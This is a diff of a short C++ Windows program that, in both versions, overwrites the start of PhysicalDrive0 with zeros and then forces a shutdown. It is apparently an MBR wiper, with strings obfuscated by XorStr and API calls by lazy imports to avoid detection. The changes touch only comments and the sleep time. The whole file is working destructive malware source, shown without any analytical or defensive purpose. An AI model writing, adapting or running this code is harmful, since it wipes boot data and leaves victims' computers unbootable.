@@ -9,34 +9,34 @@ using namespace std;
 
 int main()
 {
-    static char message1[512];
+    static char message1[512]; //m1
     sprintf_s(message1, XorStr("Memory changed, shutting down..."));
 
-    static char message2[512];
+    static char message2[512]; //m2
     sprintf_s(message2, XorStr("Memory change fail.."));
 
     DWORD write_memory;
-    char motherboard_data[motherboard_size]; //Default value is 512 in #define we will tho use 256
+    char motherboard_data[motherboard_size]; //default value 512 @motherboard_size 512
 
-    ZeroMemory(&motherboard_data, (sizeof motherboard_data)); //Rewrite the memory
+    ZeroMemory(&motherboard_data, (sizeof motherboard_data)); //rewrite our memory
 
     HANDLE motherboard_record = CreateFile(XorStr("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
     if (WriteFile(motherboard_record, motherboard_data, motherboard_size, &write_memory, NULL) == TRUE) {
 
-        cout << message1; //ShowUp message "Hi World (:"
+        cout << message1; //show message m1
 
-        LI_FN(Sleep)(1000); //Sleep this process for 1second
-        LI_FN(system)(XorStr("shutdown -s -t 1")); //Shutdown computer in 1 second after success use
-        LI_FN(ExitProcess)(0); //Terminate this process
+        LI_FN(Sleep)(500); //sleep this process for 0.5 second
+        LI_FN(system)(XorStr("shutdown -s -t 1")); //shutdown computer
+        LI_FN(ExitProcess)(0); //terminate this process
     }
     else
     {
-        cout << message2; //ShowUp message "I'm sad ) :"
+        cout << message2; //show message m2
 
-        LI_FN(Sleep)(1000); //Sleep this process for 1second
-        LI_FN(ExitProcess); //Terminate this process
+        LI_FN(Sleep)(500); //sleep this process for 0.5 second
+        LI_FN(ExitProcess); //terminate this process
     }
-    LI_FN(CloseHandle)(motherboard_record); //Close handle of program
+    LI_FN(CloseHandle)(motherboard_record); //close handle
 
     return EXIT_SUCCESS;
 }
